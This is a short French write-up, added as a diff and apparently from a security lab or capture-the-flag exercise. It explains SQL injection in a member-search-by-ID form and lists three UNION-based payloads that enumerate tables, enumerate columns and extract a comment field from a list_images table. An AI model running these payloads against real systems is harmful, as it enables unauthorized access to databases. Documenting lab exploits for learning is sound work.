@@ -1,0 +1,18 @@
+Définition :
+L’injection SQL est une vulnérabilité qui se produit lorsqu’une application insère directement des données provenant de l’utilisateur
+dans une requête SQL sans les filtrer ou les préparer correctement.
+Cela permet à un attaquant de modifier le comportement de la requête et d’accéder à des données qu’il ne devrait pas voir.
+
+Dans notre cas :
+Le site a un formulaire pour chercher un membre par son ID.
+Le champ ID est utilisé directement dans une requête SQL.
+On a pu injecter des commandes SQL comme :
+
+Trouver les noms de la table :
+1 UNION SELECT table_name, null FROM information_schema.tables WHERE table_schema=database() -- 
+
+Trouver les column_name :
+1 UNION SELECT column_name, null FROM information_schema.columns WHERE table_name=0x6c6973745f696d61676573
+
+
+1 UNION ALL SELECT 1, comment FROM list_images WHERE id=5 --
